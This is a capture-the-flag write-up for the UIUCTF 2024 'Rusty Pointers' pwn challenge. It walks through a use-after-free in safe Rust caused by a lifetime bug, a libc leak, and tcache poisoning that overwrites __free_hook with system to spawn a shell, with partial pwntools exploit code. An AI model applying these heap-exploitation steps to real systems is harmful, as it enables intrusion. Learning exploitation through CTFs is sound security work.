# Rusty Pointers

|||
|-|-|
|  **CTF**  |  [UIUCTF](https://2024.uiuc.tf/) [(CTFtime)](https://ctftime.org/event/2275)  |
|  **Author** |  Surg |
|  **Category** |  Pwn |
|  **Solves** |  36  |
| **Files** |  [dist.zip](<dist.zip>)  |

![image](https://github.com/0xM4hm0ud/CTF-Writeups/assets/80924519/00cd301d-db3e-43d2-915d-29afa6cc92b4)

# Solution

After unzipping, we get a few files:

![image](https://github.com/0xM4hm0ud/CTF-Writeups/assets/80924519/75bff07c-1c0e-4775-9b67-2a1f130a823b)

We get some libraries, source code, a Dockerfile, and the binary of the challenge.

I patched the program with [`pwninit`](https://github.com/io12/pwninit) and [`patchelf`](https://github.com/NixOS/patchelf) so that it links with the correct libraries.
```sh
> pwninit
> patchelf --replace-needed libpthread.so.0 ./libpthread-2.31.so rusty_ptrs_patched
```

Let's check the protections of the binary:

![image](https://github.com/0xM4hm0ud/CTF-Writeups/assets/80924519/e5261ee5-8af5-49e5-aa06-847daa5f6904)

We can see everything is enabled except the canary.
If we check the source code, we can see that it's a Rust binary:

```rust

use std::io::{stdin, stdout, Write, Read};
use std::{io, mem, process};

const LEN: usize = 64;
const LEN2: usize = 2000;
const LEN3: usize = 80;

type RulesT = Vec<&'static mut [u8; LEN]>;
type NotesT = Vec<Box<[u8; LEN]>>;
type LawsT = Vec<Box<[u8; LEN3]>>;

fn main() {
	let mut rules: RulesT = Vec::new();
	let mut notes: NotesT = Vec::new();
    loop {
        menu();
        prompt();
        let mut choice = String::new();
        io::stdin()
            .read_line(&mut choice)
            .expect("failed to read input.");
		if choice.is_empty() {
			continue;
		}
        let choice: i32 = choice.trim().parse().expect("invalid input");

        match choice {
			1 => handle_create(&mut rules, &mut notes),
			2 => handle_delete(&mut rules, &mut notes),
			3 => handle_read(&mut rules, &mut notes),
			4 => handle_edit(&mut rules, &mut notes),
			5 => make_law(),
            6 => {
                println!("Bye!");
                process::exit(0);
            },
            _ => println!("Invalid choice!"),
		}
	}
}

fn menu() {
	println!("1. Create a Rule or Note");
	println!("2. Delete a Rule or Note");
	println!("3. Read a Rule or Note");
	println!("4. Edit a Rule or Note");
	println!("5. Make a Law");
	println!("6. Exit");
}

fn submenu(){
	println!("1. Rules");
	println!("2. Notes");
}

#[inline(never)]
fn prompt() {
    print!("> ");
    io::stdout().flush().unwrap();
}

#[inline(never)]
fn get_rule() -> &'static mut [u8; LEN] {
	let mut buffer = Box::new([0; LEN]);
	return get_ptr(&mut buffer);
}

#[inline(never)]
fn get_law() -> &'static mut [u8; LEN2] {
	let mut buffer = Box::new([0; LEN2]);
	let mut _buffer2 = Box::new([0; 16]);
	return get_ptr(&mut buffer);
}

#[inline(never)]
fn get_note() -> Box<[u8; LEN]>{
	return Box::new([0; LEN])
}

const S: &&() = &&();
#[inline(never)]
fn get_ptr<'a, 'b, T: ?Sized>(x: &'a mut T) -> &'b mut T {
	fn ident<'a, 'b, T: ?Sized>(
        _val_a: &'a &'b (),
        val_b: &'b mut T,
	) -> &'a mut T {
			val_b
	}
	let f: fn(_, &'a mut T) -> &'b mut T = ident;
	f(S, x)
}

fn read_buf(buf: [u8; LEN]) {
	println!("Contents of Buffer: \n{buf:?}");
	let v1: i64 = i64::from_le_bytes(buf[0..8].try_into().unwrap());
	let v2: i64 = i64::from_le_bytes(buf[8..16].try_into().unwrap());
	println!("{:#08x}, {:#08x}", v1, v2);
}

fn edit_buf(buf: &mut [u8; LEN]){
	println!("Send up to 64 bytes.");
	prompt();
	let stdin = io::stdin();
	let mut handle = stdin.lock();
	let _ = handle.read(buf);
	io::stdout().flush().unwrap();
}

fn create_rule(rules: &mut RulesT){
	let buf = get_rule();
	rules.push(buf);
	println!("Rule Created!");
}

fn create_note(notes: &mut NotesT){
	let buf = get_note();
	notes.push(buf);
	println!("Note Created!");
}

fn make_law(){
	let bufa = Box::new([b'\0'; LEN2]);
	let _bufb = Box::new([b'\0'; LEN2]);
	std::mem::drop(bufa);
	let buf: &mut [u8; 2000] = get_law();
	let v1: i64 = i64::from_le_bytes(buf[0..8].try_into().unwrap());
	let v2: i64 = i64::from_le_bytes(buf[8..16].try_into().unwrap());
	println!("{:#08x}, {:#08x}", v1, v2);
}

fn delete_rule(rules: &mut RulesT){
	println!("Which Rule? ");
	prompt();
	let mut choice = String::new();
	io::stdin()
		.read_line(&mut choice)
		.expect("faled to read input");
	let choice: usize = choice.trim().parse().expect("invalid input");

	if choice >= rules.len() {
		println!("OOB!");
	} else {
		rules.remove(choice);
	}
	println!("Rule Removed!");
}

fn delete_note(notes: &mut NotesT){
	println!("Which Note? ");
	prompt();
	let mut choice = String::new();
	io::stdin()
		.read_line(&mut choice)
		.expect("faled to read input");
	let choice: usize = choice.trim().parse().expect("invalid input");

	if choice >= notes.len() {
		println!("OOB!");
	} else {
		notes.remove(choice);
	}
	println!("Note Deleted!");
}

fn read_rule(rules: &mut RulesT){
	println!("Which Rule? ");
	prompt();
	let mut choice = String::new();
	io::stdin()
		.read_line(&mut choice)
		.expect("faled to read input");
	let choice: usize = choice.trim().parse().expect("invalid input");

	if choice >= rules.len() {
		println!("OOB!");
	} else {
		read_buf(*rules[choice]);
	}
}

fn read_note(notes: &mut NotesT){
	println!("Which Note? ");
	prompt();
	let mut choice = String::new();
	io::stdin()
		.read_line(&mut choice)
		.expect("faled to read input");
	let choice: usize = choice.trim().parse().expect("invalid input");

	if choice >= notes.len() {
		println!("OOB!");
	} else {
		read_buf(*notes[choice]);
	}
}

fn edit_rule(rules: &mut RulesT){
	println!("Which Rule? ");
	prompt();
	let mut choice = String::new();
	io::stdin()
		.read_line(&mut choice)
		.expect("faled to read input");
	let choice: usize = choice.trim().parse().expect("invalid input");

	if choice >= rules.len() {
		println!("OOB!");
	} else {
		edit_buf(&mut rules[choice]);
	}
}

fn edit_note(notes: &mut NotesT){
	println!("Which Note? ");
	prompt();
	let mut choice = String::new();
	io::stdin()
		.read_line(&mut choice)
		.expect("faled to read input");
	let choice: usize = choice.trim().parse().expect("invalid input");

	if choice >= notes.len() {
		println!("OOB!");
	} else {
		edit_buf(&mut notes[choice]);
	}
}

fn handle_create(rules: &mut RulesT, notes: &mut NotesT) {
	submenu();
	prompt();
	let mut choice = String::new();
	io::stdin()
		.read_line(&mut choice)
		.expect("failed to read input.");
	let choice: i32 = choice.trim().parse().expect("invalid input");

	match choice {
		1 => create_rule(rules),
		2 => create_note(notes),
		_ => println!("Invalid Choice!")
	}	
}

fn handle_edit(rules: &mut RulesT, notes: &mut NotesT) {
	submenu();
	prompt();
	let mut choice = String::new();
	io::stdin()
		.read_line(&mut choice)
		.expect("failed to read input.");
	let choice: i32 = choice.trim().parse().expect("invalid input");

	match choice {
		1 => edit_rule(rules),
		2 => edit_note(notes),
		_ => println!("Invalid Choice!")
	}
}

fn handle_delete(rules: &mut RulesT, notes: &mut NotesT) {
	submenu();
	prompt();
	let mut choice = String::new();
	io::stdin()
		.read_line(&mut choice)
		.expect("failed to read input.");
	let choice: i32 = choice.trim().parse().expect("invalid input");

	match choice {
		1 => delete_rule(rules),
		2 => delete_note(notes),
		_ => println!("Invalid Choice!")
	}		
}

fn handle_read(rules: &mut RulesT, notes: &mut NotesT) {
	submenu();
	prompt();
	let mut choice = String::new();
	io::stdin()
		.read_line(&mut choice)
		.expect("failed to read input.");
	let choice: i32 = choice.trim().parse().expect("invalid input");

	match choice {
		1 => read_rule(rules),
		2 => read_note(notes),
		_ => println!("Invalid Choice!")
	}		
}
```

We can see that we have a few options to choose from:

```
1. Create a Rule or Note
2. Delete a Rule or Note
3. Read a Rule or Note
4. Edit a Rule or Note
5. Make a Law
6. Exit
```

When I see this menu in a challenge, I always think about the heap. 
We know it's a Rust binary without `unsafe` keywords, so is this even possible? The short answer is yes.

But let's first understand the code.

# Understanding the program logic

We can see a few types defined and some constant variables:

```rust
const LEN: usize = 64;
const LEN2: usize = 2000;
const LEN3: usize = 80;

type RulesT = Vec<&'static mut [u8; LEN]>;
type NotesT = Vec<Box<[u8; LEN]>>;
type LawsT = Vec<Box<[u8; LEN3]>>;
```

We see 3 types defined:

**RulesT**: Vector of mutable references to static arrays of u8 with length LEN. <br/>
**NotesT**: Vector of heap-allocated arrays of u8 with length LEN. <br/>
**LawsT**: Vector of heap-allocated arrays of u8 with length LEN3. <br/>

The `LawsT` type is not used in the code. The other two are used in the code. In the `RulesT` type, we can see this: `&'static`.

This indicates that the reference has a [`'static`](https://doc.rust-lang.org/rust-by-example/scope/lifetime/static_lifetime.html) lifetime, meaning the data it points to must live for the entire duration of the program.

Let's check now how the menu works. In the main function, it reads our input and calls a specific function based on our input.

```rust
let choice: i32 = choice.trim().parse().expect("invalid input");

match choice {
  1 => handle_create(&mut rules, &mut notes),
  2 => handle_delete(&mut rules, &mut notes),
  3 => handle_read(&mut rules, &mut notes),
  4 => handle_edit(&mut rules, &mut notes),
  5 => make_law(),
  6 => {
      println!("Bye!");
      process::exit(0);
  },
  _ => println!("Invalid choice!"),
}
```

### 1. Create a Rule or Note
This will call the function `handle_create`. In this function, it prints a submenu and reads our input again. We can choose between a rule or a note.

```rust
match choice {
  1 => create_rule(rules),
  2 => create_note(notes),
  _ => println!("Invalid Choice!")
}
```
Based on our input, it will call the create function for the specific type.

```rust
fn create_rule(rules: &mut RulesT){
	let buf = get_rule();
	rules.push(buf);
	println!("Rule Created!");
}

fn create_note(notes: &mut NotesT){
	let buf = get_note();
	notes.push(buf);
	println!("Note Created!");
}
```
It will call a get function and add it to the vector `notes` or `rules` that was defined in the main function.

```rust
#[inline(never)]
fn get_rule() -> &'static mut [u8; LEN] {
	let mut buffer = Box::new([0; LEN]);
	return get_ptr(&mut buffer);
}

#[inline(never)]
fn get_note() -> Box<[u8; LEN]>{
	return Box::new([0; LEN])
}
```
The `get_rule` function creates a new variable buffer with a Box element. It will then call the `get_ptr` function with the variable buffer. <br/>
The `get_note` function returns a new Box element. The `get_ptr` function is this:

```rust
const S: &&() = &&();
#[inline(never)]
fn get_ptr<'a, 'b, T: ?Sized>(x: &'a mut T) -> &'b mut T {
	fn ident<'a, 'b, T: ?Sized>(
        _val_a: &'a &'b (),
        val_b: &'b mut T,
	) -> &'a mut T {
			val_b
	}
	let f: fn(_, &'a mut T) -> &'b mut T = ident;
	f(S, x)
}
```
This code looks complicated. It returns a pointer to the variable that's given as the argument to this function. 
When given to ChatGPT, it explains it like this:

```
Lifetime Parameters:

'a and 'b are lifetime parameters that specify the lifetimes of the references.
The function aims to return a mutable reference with a different lifetime than the one it receives.

Nested Function:

The nested function ident takes two arguments: _val_a of type &'a &'b () and val_b of type &'b mut T.
It simply returns val_b, but with a different lifetime ('a instead of 'b).

Function Pointer:

The nested function ident is assigned to a function pointer f.
The function f is then called with the constant S and the mutable reference x.
```

To my understanding, this code returns the reference/pointer to the memory of the argument. It will change the lifetime while doing this.
During the CTF, I didn't use ChatGPT. When I saw this function, I remembered a bug in Rust. There is an [issue](https://github.com/rust-lang/rust/issues/25860) from 2015 that is still open, which talks about this bug. The function looked similar.
I also remembered a [repo](https://github.com/Speykious/cve-rs/blob/main/src/lifetime_expansion.rs) that used this bug to showcase different vulnerabilities like UAF (use after free) etc. If we check the source code, we can see similar code.
There is also a good explanation there, so read that to understand the bug.

### 2. Delete a Rule or Note

```rust
fn delete_rule(rules: &mut RulesT){
	println!("Which Rule? ");
	prompt();
	let mut choice = String::new();
	io::stdin()
		.read_line(&mut choice)
		.expect("faled to read input");
	let choice: usize = choice.trim().parse().expect("invalid input");

	if choice >= rules.len() {
		println!("OOB!");
	} else {
		rules.remove(choice);
	}
	println!("Rule Removed!");
}

fn delete_note(notes: &mut NotesT){
	println!("Which Note? ");
	prompt();
	let mut choice = String::new();
	io::stdin()
		.read_line(&mut choice)
		.expect("faled to read input");
	let choice: usize = choice.trim().parse().expect("invalid input");

	if choice >= notes.len() {
		println!("OOB!");
	} else {
		notes.remove(choice);
	}
	println!("Note Deleted!");
}
```

It will remove the box from the vector `notes` or `rules` when deleting. It checks for OOB (out-of-bounds) access.

### 3. Read a Rule or Note

```rust
fn read_buf(buf: [u8; LEN]) {
	println!("Contents of Buffer: \n{buf:?}");
	let v1: i64 = i64::from_le_bytes(buf[0..8].try_into().unwrap());
	let v2: i64 = i64::from_le_bytes(buf[8..16].try_into().unwrap());
	println!("{:#08x}, {:#08x}", v1, v2);
}

fn read_rule(rules: &mut RulesT){
	println!("Which Rule? ");
	prompt();
	let mut choice = String::new();
	io::stdin()
		.read_line(&mut choice)
		.expect("faled to read input");
	let choice: usize = choice.trim().parse().expect("invalid input");

	if choice >= rules.len() {
		println!("OOB!");
	} else {
		read_buf(*rules[choice]);
	}
}

fn read_note(notes: &mut NotesT){
	println!("Which Note? ");
	prompt();
	let mut choice = String::new();
	io::stdin()
		.read_line(&mut choice)
		.expect("faled to read input");
	let choice: usize = choice.trim().parse().expect("invalid input");

	if choice >= notes.len() {
		println!("OOB!");
	} else {
		read_buf(*notes[choice]);
	}
}
```

When reading, it will also check for OOB on the index we provide. 
It will then call the function `read_buf`. This function prints 2 bytes of the buffer (note or rule).

### 4. Edit a Rule or Note

```rust
fn edit_buf(buf: &mut [u8; LEN]){
	println!("Send up to 64 bytes.");
	prompt();
	let stdin = io::stdin();
	let mut handle = stdin.lock();
	let _ = handle.read(buf);
	io::stdout().flush().unwrap();
}

fn edit_rule(rules: &mut RulesT){
	println!("Which Rule? ");
	prompt();
	let mut choice = String::new();
	io::stdin()
		.read_line(&mut choice)
		.expect("faled to read input");
	let choice: usize = choice.trim().parse().expect("invalid input");

	if choice >= rules.len() {
		println!("OOB!");
	} else {
		edit_buf(&mut rules[choice]);
	}
}

fn edit_note(notes: &mut NotesT){
	println!("Which Note? ");
	prompt();
	let mut choice = String::new();
	io::stdin()
		.read_line(&mut choice)
		.expect("faled to read input");
	let choice: usize = choice.trim().parse().expect("invalid input");

	if choice >= notes.len() {
		println!("OOB!");
	} else {
		edit_buf(&mut notes[choice]);
	}
}
```
It again checks for OOB access. It then calls the function `edit_buf`, where we can send 64 bytes.

### 5. Make a Law

```rust
#[inline(never)]
fn get_law() -> &'static mut [u8; LEN2] {
	let mut buffer = Box::new([0; LEN2]);
	let mut _buffer2 = Box::new([0; 16]);
	return get_ptr(&mut buffer);
}

fn make_law(){
	let bufa = Box::new([b'\0'; LEN2]);
	let _bufb = Box::new([b'\0'; LEN2]);
	std::mem::drop(bufa);
	let buf: &mut [u8; 2000] = get_law();
	let v1: i64 = i64::from_le_bytes(buf[0..8].try_into().unwrap());
	let v2: i64 = i64::from_le_bytes(buf[8..16].try_into().unwrap());
	println!("{:#08x}, {:#08x}", v1, v2);
}
```

The function `make_law` creates two boxes, both with a length of 2000 (`LEN2`). 
It will then drop (free) the first buffer. It then calls the function `get_law`. After that, it prints 2 bytes of the buffer that we got from `get_law`.

### 6. Exit
This will exit the program. 

# Vulnerabilities

So what are the vulnerabilities. We didnt see any `unsafe` keyword. We did talk about the bug in the `get_ptr` function. This function will change the lifetime that can lead to UAF. 
The vulnerability we have is an UAF one. 

```rust
fn get_rule() -> &'static mut [u8; LEN] {
	let mut buffer = Box::new([0; LEN]);
	return get_ptr(&mut buffer);
}
```

In the function `get_rule`, it will create a new box called buffer. The lifetime of this buffer ends inside this function. You can read more about boxes [here](https://doc.rust-lang.org/rust-by-example/std/box.html#box-stack-and-heap). 
When calling `get_ptr` with this variable to get the reference, it will return it as `&'static mut [u8; LEN]`. 
Because of the bug we talked about earlier, we will have a reference to the buffer while the buffer will be freed after returning from `get_rule`. 
When viewing this method in gdb, we can compare this to the function `get_note`. The `get_note` function will return the box, so it won't be freed (because the ownership is given to the function that called the `get_note` function).

`get_note`:

![image](https://github.com/0xM4hm0ud/CTF-Writeups/assets/80924519/af7f79c8-d12f-44d5-8aca-a21e9bb70456)

We can see that it will call `malloc` to create the `Box`. Upon returning, it moves the value from stack to rax.(Yellow boxes). 

`get_rule`:

![image](https://github.com/0xM4hm0ud/CTF-Writeups/assets/80924519/a58146f9-7367-4844-9196-917e7e853543)

Here, it also allocates memory (green box) for the box. Before returning, it will call `free` on the box (blue box).
When `get_ptr` is called, it will save the return value at the top of the stack. Upon returning, it moves the value from the stack into the `rax` register (yellow boxes).

So, while freeing a `Box` and still having a reference to it, we encounter a Use-After-Free (UAF) vulnerability.

As we have seen earlier, the binary has PIE enabled. ASLR is also enabled by default. Therefore, we need to find a way to leak memory. Fortunately, there are two methods to achieve this. 
Firstly, with the `get_rule` function, we can leak heap memory. `get_rule` creates a chunk of size `LEN` (64 bytes). When this chunk is freed, it goes into the tcache. 
This leaves a heap address in the chunk, which can be leaked.
Secondly, the `make_law` function provides another way to leak memory. It creates two large boxes of size 2000 (`LEN2`). After freeing the first box, it calls `get_law`, which operates similarly to `get_rule`. 
Since the chunk size is larger than the tcache range, it goes into the unsorted bin. This results in libc pointers being placed in the chunk when it is freed, allowing for an easy memory leak by simply calling `make_law`.

Additionally, there is a vulnerability when deleting a note or rule. While it removes the item from the vector, the underlying chunk itself is not deleted.

# Exploitation

Now, finally, to the exploitation part. What can we do with this vulnerability? 
There is a technique called [`tcache poisoning`](https://github.com/shellphish/how2heap/blob/master/glibc_2.31/tcache_poisoning.c).
This technique allows us to allocate a chunk at an arbitrary location. With this, we can use the edit functionality to change anything we want, essentially creating a write-what-where primitive.

The Global Offset Table (GOT) is full RELRO, so we can't overwrite that. However, the GOT of the libc is partial RELRO. We can try to overwrite that. In the libc 2.31 version, the `__malloc_hook` and `__free_hook` are not removed. These hooks will be called when `malloc` or `free` is invoked. Therefore, if we overwrite one of these hooks, it will redirect execution flow when `malloc` or `free` is called.
I overwrote the hooks instead of libc GOT.

Let's start exploiting. First, I will create a few helpful functions:

```py
rule = 1
note = 2

def create(op):
    io.sendlineafter(b'>', b'1')
    io.sendlineafter(b'>', str(op).encode())


def delete(op, idx):
    io.sendlineafter(b'>', b'2')
    io.sendlineafter(b'>', str(op).encode())
    io.sendlineafter(b'>', str(idx).encode())


def show(op, idx):
    io.sendlineafter(b'>', b'3')
    io.sendlineafter(b'>', str(op).encode())
    io.sendlineafter(b'>', str(idx).encode())


def edit(op, idx, data):
    io.sendlineafter(b'>', b'4')
    io.sendlineafter(b'>', str(op).encode())
    io.sendlineafter(b'>', str(idx).encode())
    io.sendlineafter(b'>', data)

def law():
    io.sendlineafter(b'>', b'5')
    return io.recvline()[1:-1].split(b', ')
```

We can obtain the libc base address, `__free_hook`, and `system` by leaking via the `make_law` function:

```py
leak = law()
libc.address = int(leak[0], 16) - 0x1ecbe0
free_hook = libc.sym['__free_hook']
system = libc.sym['system']
log.success("Libc base address: %#x", libc.address)
log.success("Free hook address: %#x", free_hook)
log.success("System address: %#x", system)
```

Now we can perform tcache poisoning to place a chunk at the `__free_hook`. To achieve this, we need to modify the `fd` pointer of a freed tcache chunk. 
First, I will create 2 note chunks and free them. We can observe both chunks in the tcache bin:

![image](https://github.com/0xM4hm0ud/CTF-Writeups/assets/80924519/179ff179-c52c-477f-b313-e339723e426d)

Next, when creating a rule, it will retrieve a chunk from the tcache, obtain its pointer, and then free the buffer again. Since tcache operates in a LIFO (Last-in, First-out) manner, we gain control over the first chunk's `fd` and `bk` pointers:

![image](https://github.com/0xM4hm0ud/CTF-Writeups/assets/80924519/fc39b79d-6bf1-41fe-8d44-d75c09b8089b)

By editing the `fd` pointer of this chunk (due to the UAF), we can confirm that it points to `__free_hook`:

![image](https://github.com/0xM4hm0ud/CTF-Writeups/assets/80924519/a62b6abe-91c1-4596-a959-ac6401c14a4c)

Now, if we create 2 more notes, the second note will occupy the `__free_hook` address. 
Upon editing the second note to point to `system`, we can observe the change:

![image](https://github.com/0xM4hm0ud/CTF-Writeups/assets/80924519/3c10f2f2-d826-40a4-b285-1ab1ca2adc83)

Finally, if we free a chunk containing `/bin/sh`, it will spawn a shell. The complete solution script can be found [here](solve.py).

Upon running this on the remote server, we successfully obtain a shell and can read the flag:

![image](https://github.com/0xM4hm0ud/CTF-Writeups/assets/80924519/a8ee72ef-ff7d-4c8b-b615-40d54ce12cc3)


